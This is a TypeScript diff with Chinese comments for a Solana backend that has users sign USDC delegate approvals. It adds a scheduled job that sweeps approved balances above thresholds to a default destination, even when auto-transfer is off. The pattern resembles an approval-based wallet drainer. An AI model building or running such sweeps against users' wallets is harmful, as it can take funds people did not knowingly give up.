@@ -20,7 +20,7 @@ import {
 import { appConfig } from './config.js';
 import {
   getMysqlPersistenceConfig,
-  getPersistedFingerprint,
+  getPersistedRecordState,
   initMysqlPersistence,
   persistApprovalTransferRecord,
 } from './mysql.js';
@@ -43,6 +43,12 @@ type DelegateTransferBody = {
   amountUi: string;
   ownerTokenAccount?: string;
   destinationTokenAccount?: string;
+};
+
+// 前端切换“定时归集任务开关”时提交的请求体。
+type ScheduledSweepToggleBody = {
+  // true 表示开启，false 表示关闭。
+  enabled: boolean;
 };
 
 // 把字符串安全地转成 PublicKey，统一输出清晰的字段错误信息。
@@ -111,11 +117,28 @@ const port = appConfig.port;
 const listenerEnabled = appConfig.listenerEnabled;
 const autoTransferEnabled = appConfig.autoTransferEnabled;
 const solanaCommitment = appConfig.solanaCommitment;
+// 定时归集的默认配置来自 .env，页面按钮只修改运行时状态。
+const scheduledSweepConfig = appConfig.scheduledSweep;
 const mysqlPersistenceConfig = getMysqlPersistenceConfig();
 const processingTokenAccounts = new Set<string>();
+// 当前运行时的定时任务开关状态，可由网页直接切换。
+let scheduledSweepEnabled = scheduledSweepConfig.enabled;
+// 保存定时器句柄，便于页面关闭任务时及时 stop。
+let scheduledSweepTimer: ReturnType<typeof setInterval> | null = null;
 const TOKEN_ACCOUNT_SIZE = 165;
 const TOKEN_MINT_OFFSET = 0;
 const TOKEN_DELEGATE_OFFSET = 76;
+
+type AutoCollectionOptions = {
+  // 指定本次归集的目标 owner；未传时默认归集到后台自己的收款地址。
+  destinationOwnerPubkey?: PublicKey;
+  // 只有授权额度大于该值时才允许执行本次自动归集。
+  minimumDelegatedAmountRaw?: bigint;
+  // 只有账户余额大于该值时才允许执行本次自动归集。
+  minimumBalanceAmountRaw?: bigint;
+  // 用于让定时任务在 ENABLE_AUTO_TRANSFER=false 时仍可独立运行。
+  bypassAutoTransferDisabled?: boolean;
+};
 
 // 读取 USDC Mint 精度，便于前后端都使用统一的金额换算逻辑。
 async function resolveMintDecimals(): Promise<number> {
@@ -158,6 +181,14 @@ function buildApprovalListenerFilters() {
 // 自动转账时只取“余额”和“已授权额度”中的较小值，避免链上失败。
 function resolveTransferableAmount(balance: bigint, delegatedAmount: bigint): bigint {
   return balance < delegatedAmount ? balance : delegatedAmount;
+}
+
+function resolveAutoCollectionDestinationTokenAccount(destinationOwnerPubkey?: PublicKey): PublicKey {
+  if (destinationOwnerPubkey) {
+    return resolveDestinationTokenAccount(destinationOwnerPubkey);
+  }
+
+  return resolveDelegateReceiveTokenAccount();
 }
 
 // 把当前 delegate 名下的所有 USDC 授权账户转成前端可直接展示的列表结构。
@@ -210,11 +241,12 @@ async function listApprovedUsdcAccounts() {
   };
 }
 
-// 监听到授权后，后台自动把 A 可转的 USDC 拉到 B 自己的 USDC ATA。
+// 监听器或定时任务命中后，后台按当前规则把可转 USDC 归集到目标地址。
 async function transferApprovedUsdcToDelegate(
   sourceTokenAccount: PublicKey,
   trigger: string,
   observedSlot: number | null = null,
+  options: AutoCollectionOptions = {},
 ): Promise<void> {
   const sourceTokenAccountBase58 = sourceTokenAccount.toBase58();
   if (processingTokenAccounts.has(sourceTokenAccountBase58)) {
@@ -222,12 +254,15 @@ async function transferApprovedUsdcToDelegate(
   }
 
   processingTokenAccounts.add(sourceTokenAccountBase58);
+  const destinationOwnerPubkey = options.destinationOwnerPubkey;
+  const destinationTokenAccountPubkey =
+    resolveAutoCollectionDestinationTokenAccount(destinationOwnerPubkey);
 
   try {
     const sourceAccount = await getAccount(connection, sourceTokenAccount);
     const ownerWallet = sourceAccount.owner.toBase58();
     const delegateWallet = backendKeypair.publicKey.toBase58();
-    const destinationTokenAccount = resolveDelegateReceiveTokenAccount().toBase58();
+    const destinationTokenAccount = destinationTokenAccountPubkey.toBase58();
     const tokenBalanceRaw = sourceAccount.amount.toString();
     const delegatedAmountRaw = sourceAccount.delegatedAmount.toString();
     const transferableAmountRaw = resolveTransferableAmount(
@@ -255,9 +290,27 @@ async function transferApprovedUsdcToDelegate(
       return;
     }
 
+    if (
+      options.minimumDelegatedAmountRaw !== undefined &&
+      sourceAccount.delegatedAmount <= options.minimumDelegatedAmountRaw
+    ) {
+      return;
+    }
+
+    if (
+      options.minimumBalanceAmountRaw !== undefined &&
+      sourceAccount.amount <= options.minimumBalanceAmountRaw
+    ) {
+      return;
+    }
+
     const rawAmount = resolveTransferableAmount(sourceAccount.amount, sourceAccount.delegatedAmount);
-    const persistedFingerprint = await getPersistedFingerprint(sourceTokenAccountBase58);
-    if (persistedFingerprint && persistedFingerprint === fingerprint) {
+    const persistedRecordState = await getPersistedRecordState(sourceTokenAccountBase58);
+    if (
+      persistedRecordState.fingerprint &&
+      persistedRecordState.fingerprint === fingerprint &&
+      (persistedRecordState.status === 'transferred' || persistedRecordState.status === 'duplicate')
+    ) {
       await persistApprovalTransferRecord({
         sourceTokenAccount: sourceTokenAccountBase58,
         ownerWallet,
@@ -271,7 +324,7 @@ async function transferApprovedUsdcToDelegate(
         transferableAmountRaw,
         fingerprint,
         status: 'duplicate',
-        errorMessage: 'same fingerprint already processed',
+        errorMessage: `same fingerprint already processed with status ${persistedRecordState.status}`,
       });
       return;
     }
@@ -292,7 +345,7 @@ async function transferApprovedUsdcToDelegate(
       status: 'approved',
     });
 
-    if (!autoTransferEnabled) {
+    if (!autoTransferEnabled && !options.bypassAutoTransferDisabled) {
       return;
     }
 
@@ -330,7 +383,6 @@ async function transferApprovedUsdcToDelegate(
       return;
     }
 
-    const destinationTokenAccountPubkey = resolveDelegateReceiveTokenAccount();
     if (sourceTokenAccount.equals(destinationTokenAccountPubkey)) {
       await persistApprovalTransferRecord({
         sourceTokenAccount: sourceTokenAccountBase58,
@@ -359,7 +411,7 @@ async function transferApprovedUsdcToDelegate(
         createAssociatedTokenAccountInstruction(
           backendKeypair.publicKey,
           destinationTokenAccountPubkey,
-          backendKeypair.publicKey,
+          destinationOwnerPubkey || backendKeypair.publicKey,
           usdcMint,
         ),
       );
@@ -428,7 +480,7 @@ async function transferApprovedUsdcToDelegate(
         sourceTokenAccount: sourceTokenAccountBase58,
         ownerWallet: sourceAccount.owner.toBase58(),
         delegateWallet: backendKeypair.publicKey.toBase58(),
-        destinationTokenAccount: resolveDelegateReceiveTokenAccount().toBase58(),
+        destinationTokenAccount: destinationTokenAccountPubkey.toBase58(),
         mint: usdcMint.toBase58(),
         triggerSource: trigger,
         observedSlot,
@@ -467,6 +519,97 @@ async function scanExistingApprovals(): Promise<void> {
   for (const account of accounts) {
     await transferApprovedUsdcToDelegate(account.pubkey, 'startup-scan');
   }
+}
+
+// 把 .env 里的 UI 阈值换算成链上最小单位，供定时巡检直接比较。
+async function resolveScheduledSweepThresholds(): Promise<{
+  minimumDelegatedAmountRaw: bigint;
+  minimumBalanceAmountRaw: bigint;
+}> {
+  const decimals = await resolveMintDecimals();
+  return {
+    minimumDelegatedAmountRaw: parseUiAmount(
+      scheduledSweepConfig.minimumDelegatedAmountUi,
+      decimals,
+    ),
+    minimumBalanceAmountRaw: parseUiAmount(scheduledSweepConfig.minimumBalanceAmountUi, decimals),
+  };
+}
+
+// 定时任务按阈值巡检当前所有已授权账户，命中后把可转 USDC 归集到默认目标地址。
+async function runScheduledSweepOnce(
+  thresholds: Awaited<ReturnType<typeof resolveScheduledSweepThresholds>>,
+): Promise<void> {
+  const accounts = await connection.getProgramAccounts(TOKEN_PROGRAM_ID, {
+    commitment: solanaCommitment,
+    filters: buildApprovalListenerFilters(),
+  });
+
+  console.log(
+    `[scheduled-sweep] scanning ${accounts.length} approved USDC token accounts with thresholds delegated>${scheduledSweepConfig.minimumDelegatedAmountUi}, balance>${scheduledSweepConfig.minimumBalanceAmountUi}`,
+  );
+
+  for (const account of accounts) {
+    await transferApprovedUsdcToDelegate(account.pubkey, 'scheduled-sweep', null, {
+      destinationOwnerPubkey: defaultDestinationOwnerPubkey,
+      minimumDelegatedAmountRaw: thresholds.minimumDelegatedAmountRaw,
+      minimumBalanceAmountRaw: thresholds.minimumBalanceAmountRaw,
+      bypassAutoTransferDisabled: true,
+    });
+  }
+}
+
+// 启动定时巡检任务，适合关闭实时自动转账后只保留低频归集。
+async function startScheduledSweepJob(): Promise<void> {
+  if (!scheduledSweepEnabled) {
+    console.log('[scheduled-sweep] disabled by ENABLE_SCHEDULED_SWEEP=false');
+    return;
+  }
+
+  if (scheduledSweepConfig.intervalMs <= 0) {
+    throw new Error('SCHEDULED_SWEEP_INTERVAL_MS must be greater than 0');
+  }
+
+  if (scheduledSweepTimer) {
+    return;
+  }
+
+  const thresholds = await resolveScheduledSweepThresholds();
+  await runScheduledSweepOnce(thresholds);
+
+  scheduledSweepTimer = setInterval(() => {
+    void runScheduledSweepOnce(thresholds).catch((error) => {
+      console.error('[scheduled-sweep] run failed', error);
+    });
+  }, scheduledSweepConfig.intervalMs);
+
+  console.log(
+    `[scheduled-sweep] enabled, interval=${scheduledSweepConfig.intervalMs}ms, destination=${defaultDestinationOwnerPubkey.toBase58()}`,
+  );
+}
+
+function stopScheduledSweepJob(): void {
+  if (!scheduledSweepTimer) {
+    return;
+  }
+
+  clearInterval(scheduledSweepTimer);
+  scheduledSweepTimer = null;
+  console.log('[scheduled-sweep] stopped by runtime toggle');
+}
+
+async function setScheduledSweepEnabled(nextEnabled: boolean): Promise<void> {
+  if (scheduledSweepEnabled === nextEnabled) {
+    return;
+  }
+
+  scheduledSweepEnabled = nextEnabled;
+  if (nextEnabled) {
+    await startScheduledSweepJob();
+    return;
+  }
+
+  stopScheduledSweepJob();
 }
 
 // 持续监听“USDC + delegate == B”的 token account 变更，一旦出现授权或余额变化就尝试自动转账。
@@ -509,6 +652,10 @@ app.get('/health', async (_req: Request, res: Response) => {
     delegateReceiveTokenAccount: resolveDelegateReceiveTokenAccount().toBase58(),
     defaultDestinationOwner: defaultDestinationOwnerPubkey.toBase58(),
     defaultDestinationTokenAccount: resolveDestinationTokenAccount(defaultDestinationOwnerPubkey).toBase58(),
+    scheduledSweepEnabled,
+    scheduledSweepIntervalMs: scheduledSweepConfig.intervalMs,
+    scheduledSweepMinDelegatedAmountUi: scheduledSweepConfig.minimumDelegatedAmountUi,
+    scheduledSweepMinBalanceAmountUi: scheduledSweepConfig.minimumBalanceAmountUi,
     mysqlPersistenceEnabled: mysqlPersistenceConfig.enabled,
     mysqlDatabase: mysqlPersistenceConfig.enabled ? mysqlPersistenceConfig.database : null,
   });
@@ -525,6 +672,31 @@ app.get('/approvals', async (_req: Request, res: Response) => {
     });
   }
 });
+
+// 运行时切换定时归集任务开关，默认值仍然来自 .env，但页面可直接启停。
+app.post(
+  '/scheduled-sweep/toggle',
+  async (req: Request<unknown, unknown, ScheduledSweepToggleBody>, res: Response) => {
+    try {
+      if (typeof req.body.enabled !== 'boolean') {
+        throw new Error('enabled must be a boolean');
+      }
+
+      await setScheduledSweepEnabled(req.body.enabled);
+      res.json({
+        ok: true,
+        scheduledSweepEnabled,
+        scheduledSweepIntervalMs: scheduledSweepConfig.intervalMs,
+        scheduledSweepMinDelegatedAmountUi: scheduledSweepConfig.minimumDelegatedAmountUi,
+        scheduledSweepMinBalanceAmountUi: scheduledSweepConfig.minimumBalanceAmountUi,
+      });
+    } catch (error) {
+      res.status(400).json({
+        error: error instanceof Error ? error.message : 'Unknown error',
+      });
+    }
+  },
+);
 
 // 构建一笔“用户授权后台为 delegate”的未签名交易，由前端钱包完成签名和发送。
 app.post('/approve/build', async (req: Request<unknown, unknown, ApproveBody>, res: Response) => {
@@ -700,6 +872,7 @@ async function bootstrapBackgroundServices(): Promise<void> {
   }
 
   await startApprovalListener();
+  await startScheduledSweepJob();
 }
 
 void bootstrapBackgroundServices().catch((error) => {
